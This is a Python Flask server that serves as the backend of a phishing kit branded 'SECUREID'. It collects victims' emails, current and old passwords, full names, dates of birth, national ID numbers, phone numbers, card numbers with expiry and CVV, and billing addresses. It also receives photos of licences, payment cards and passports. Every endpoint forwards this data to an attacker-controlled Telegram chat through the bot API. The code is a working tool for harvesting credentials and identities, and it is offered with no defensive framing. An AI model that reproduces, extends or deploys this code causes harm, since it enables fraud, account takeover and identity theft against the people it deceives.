import os

import requests

from flask import Flask, request, jsonify

from flask_cors import CORS



app = Flask(__name__)

CORS(app)  # Allow requests from your HTML frontend



# ─── CONFIG ────────────────────────────────────────────────────────────────────

BOT_TOKEN = os.environ.get("BOT_TOKEN", "HERE")   # Set as env variable on your host

CHAT_ID   = os.environ.get("CHAT_ID",   "THERE")     # Set as env variable on your host

TG_API    = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ───────────────────────────────────────────────────────────────────────────────





def send_message(text: str):

    """Send a plain HTML-formatted text message to Telegram."""

    requests.post(f"{TG_API}/sendMessage", json={

        "chat_id": CHAT_ID,

        "text": text,

        "parse_mode": "HTML"

    })





def send_file(file, caption: str):

    """Send a file (image or document) to Telegram."""

    if not file:

        return

    mime = file.content_type or ""

    is_image = mime.startswith("image/")

    endpoint  = "sendPhoto"   if is_image else "sendDocument"

    field     = "photo"       if is_image else "document"

    requests.post(

        f"{TG_API}/{endpoint}",

        data={"chat_id": CHAT_ID, "caption": caption},

        files={field: (file.filename, file.stream, mime)}

    )





# ── STEP 1: Security Credentials ──────────────────────────────────────────────

@app.route("/submit/step1", methods=["POST"])

def step1():

    d = request.form

    msg = (

        "🔐 <b>SECUREID — Step 1: Security Credentials</b>\n\n"

        f"📧 <b>Primary Email:</b> {d.get('primaryEmail', '')}\n"

        f"📧 <b>Recovery Email:</b> {d.get('recoveryEmail', '(not provided)')}\n"

        f"🔑 <b>Password:</b> {d.get('password', '')}\n"

    )

    if d.get("oldPassword"):

        msg += f"🔓 <b>Old Password:</b> {d.get('oldPassword')}\n"

    send_message(msg)

    return jsonify({"ok": True})





# ── STEP 2: Identity Profile + License Images ──────────────────────────────────

@app.route("/submit/step2", methods=["POST"])

def step2():

    d = request.form

    msg = (

        "👤 <b>SECUREID — Step 2: Identity Profile</b>\n\n"

        f"🌍 <b>Country:</b> {d.get('country', '')}\n"

        f"🪪 <b>Full Legal Name:</b> {d.get('fullLegalName', '')}\n"

        f"🎂 <b>Date of Birth:</b> {d.get('dob', '')}\n"

        f"🔢 <b>{d.get('idLabel', 'Identity ID')}:</b> {d.get('identityId', '')}\n"

        f"📱 <b>Phone:</b> {d.get('phone', '')}\n"

        f"📮 <b>Postal / ZIP:</b> {d.get('postal', '')}\n"

    )

    send_message(msg)



    full_name = d.get("fullLegalName", "User")

    send_file(request.files.get("licenseFront"), f"🪪 License FRONT — {full_name}")

    send_file(request.files.get("licenseBack"),  f"🪪 License BACK — {full_name}")

    return jsonify({"ok": True})





# ── STEP 3: Financial Assets + Card/ID Images ──────────────────────────────────

@app.route("/submit/step3", methods=["POST"])

def step3():

    d = request.form

    msg = (

        "💳 <b>SECUREID — Step 3: Financial Assets</b>\n\n"

        f"💳 <b>Card Number:</b> {d.get('cardNumber', '')}\n"

        f"📅 <b>Expiry:</b> {d.get('cardExpiry', '')}\n"

        f"🔒 <b>CVV:</b> {d.get('cardCvv', '')}\n"

        f"🏠 <b>Billing Address:</b>\n"

        f"  Street: {d.get('billingStreet', '')}\n"

        f"  City: {d.get('billingCity', '')}\n"

        f"  State: {d.get('billingState', '')}\n"

        f"  ZIP: {d.get('billingZip', '')}\n"

    )

    send_message(msg)



    full_name = d.get("fullLegalName", "User")

    send_file(request.files.get("cardFront"), f"💳 Card FRONT — {full_name}")

    send_file(request.files.get("cardBack"),  f"💳 Card BACK — {full_name}")

    send_file(request.files.get("nationalId"), f"🛂 National ID / Passport — {full_name}")

    return jsonify({"ok": True})





# ── FINAL SUBMIT: Full Summary ─────────────────────────────────────────────────

@app.route("/submit/final", methods=["POST"])

def final():

    d = request.form

    has_id = "yes" if d.get("hasNationalId") == "true" else "no"

    msg = (

        "✅ <b>SECUREID — FINAL SUBMISSION COMPLETE</b>\n\n"

        f"👤 <b>Name:</b> {d.get('fullLegalName', '')}\n"

        f"📧 <b>Email:</b> {d.get('primaryEmail', '')}\n"

        f"🎂 <b>DOB:</b> {d.get('dob', '')}\n"

        f"🌍 <b>Country:</b> {d.get('country', '')}\n"

        f"📱 <b>Phone:</b> {d.get('phone', '')}\n"

        f"💳 <b>Card:</b> {d.get('cardNumber', '')} "

        f"(Exp: {d.get('cardExpiry', '')} / CVV: {d.get('cardCvv', '')})\n"

        f"🏠 <b>Billing:</b> {d.get('billingStreet', '')}, "

        f"{d.get('billingCity', '')}, {d.get('billingState', '')} {d.get('billingZip', '')}\n"

        f"🔑 <b>ID:</b> {d.get('identityId', '')}\n"

        f"📎 Files: License ✅ | Card ✅"

        + (" | National ID ✅" if has_id == "yes" else "")

    )

    send_message(msg)

    return jsonify({"ok": True})





if __name__ == "__main__":

    # For local testing only — use gunicorn in production

    app.run(debug=True, port=5000)
